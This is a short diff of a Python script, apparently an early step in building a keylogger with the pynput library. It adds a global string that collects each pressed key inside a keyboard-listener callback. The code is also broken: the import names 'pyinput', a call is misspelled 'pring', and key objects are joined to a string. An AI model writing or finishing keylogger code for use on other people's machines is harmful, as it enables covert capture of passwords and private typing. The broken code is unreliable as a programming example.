@@ -5,9 +5,13 @@
 
 import pyinput.keyboard
 
+log = "" #init var for storing keystrokes
+
 def process_keypress(key):
-    log 
-    print(key)
+    global log #to define global variables
+    log = log + key
+    #print(key)
+    pring(log)
     
 
 keyboard_listener = pynput.keyboard.Listener(on_press = process_keypress)
